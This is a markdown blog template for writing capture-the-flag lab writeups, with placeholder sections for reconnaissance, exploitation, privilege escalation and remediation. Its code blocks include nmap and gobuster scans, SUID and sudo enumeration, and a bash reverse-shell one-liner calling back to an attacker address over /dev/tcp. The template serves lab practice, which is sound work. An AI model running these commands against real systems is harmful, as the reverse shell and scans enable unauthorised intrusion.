---
title: "Writeup / Project Template"
date: 2026-10-08T12:00:00+02:00
draft: true
description: "Short description that will appear on the homepage card."
tags: ["linux", "easy", "htb", "privesc"]
categories: ["Writeups"]
showTableOfContents: true
---

> This is a base template (`draft: true`). It will not be published until you set `draft: false`.
> You can duplicate this file whenever you want to write a new post.

## 📌 Overview

| Parameter | Details |
| :--- | :--- |
| **Platform** | Hack The Box / TryHackMe / VulnHub |
| **Difficulty** | Easy / Medium / Hard |
| **OS** | Linux / Windows |
| **Target IP** | `10.10.10.x` |
| **Key Points** | SQLi, File Upload, Cronjob PrivEsc |

---

## 🔍 1. Reconnaissance & Scanning

### Port Scanning with Nmap
Start by scanning for open ports and services:

```bash
# Fast port discovery
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.x -oG allPorts.txt

# Service version detection and default scripts
nmap -sC -sV -p22,80 10.10.10.x -oN targeted.txt
```

### Web Enumeration / Fuzzing
Enumerating directories and technologies on web servers:

```bash
# Directory discovery
gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```

> **Tip:** You can attach screenshots easily with:
> `![Screenshot description](screenshot.png)`

---

## 💥 2. Exploitation (Initial Access)

### Vulnerability Analysis
Detailed explanation of the vulnerability discovered and the attack vector.

### Gaining a Shell
Command or exploit used to catch a reverse shell:

```bash
# Reverse shell payload
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
```

---

## 🔑 3. Privilege Escalation

### Internal Enumeration
Checking for escalation paths (SUID binaries, sudo permissions, cron jobs, stored credentials):

```bash
sudo -l
find / -perm -4000 2>/dev/null
```

### Root Exploitation
Steps taken to escalate to `root` or `NT AUTHORITY\SYSTEM`:

```bash
whoami
# root
```

---

## 🎯 Conclusion & Remediation

- **Flags captured:** `user.txt` and `root.txt`.
- **Main vulnerability:** Root cause of the compromise.
- **Remediation:** How to secure or patch this issue in a production environment.
